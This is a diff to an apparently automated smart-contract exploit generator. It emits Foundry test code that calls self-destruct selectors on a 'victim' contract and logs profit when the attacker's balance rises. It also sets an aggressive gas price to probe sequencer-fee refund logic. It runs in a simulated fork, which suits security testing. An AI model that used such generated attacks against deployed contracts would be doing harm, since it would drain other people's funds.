@@ -408,6 +408,7 @@ def _get_self_destruct_logic(selectors: List[str]) -> str:
     logic = """
         // Try Self-Destruct triggers (Opcode 0xff detected)
         bool sdSuccess;
+        uint256 sdBalBefore = attacker.balance;
         // Capture code before potential self-destruct
         bytes memory originalCode = address(victim).code;
     """
@@ -415,7 +416,17 @@ def _get_self_destruct_logic(selectors: List[str]) -> str:
         logic += f"""
         (sdSuccess, ) = victim.call(abi.encodeWithSelector(bytes4({sel})));
         if (sdSuccess) {{
+            success = true; // Mark as successful interaction
             console.log("Self-destruct triggered with selector {sel}");
+            
+            uint256 sdBalAfter = attacker.balance;
+            if (sdBalAfter > sdBalBefore) {{
+                console.log("PROFIT_WEI:", sdBalAfter - sdBalBefore);
+                console.log("SUCCESS_METHOD: self_destruct_sweep");
+                vm.stopPrank();
+                return; // Early exit on profit
+            }}
+
             if (address(victim).code.length == 0) {{
                 console.log("Contract code destroyed. Reincarnating via vm.etch...");
                 vm.etch(victim, originalCode);
@@ -437,8 +448,9 @@ def _get_sequencer_fee_logic(bug_type: Optional[str]) -> str:
         vm.deal(attacker, 20 ether);
         uint256 sfBalBefore = attacker.balance;
         
-        // 1. Aggressive Gas Price Simulation (BaseFee * 100)
-        vm.txGasPrice(block.basefee * 100); 
+        // 1. Aggressive Gas Price Simulation
+        // Force high gas price to trigger potential refund logic
+        vm.txGasPrice(1000 gwei); 
         
         bool sfSuccess;
         // Attempt standard execute
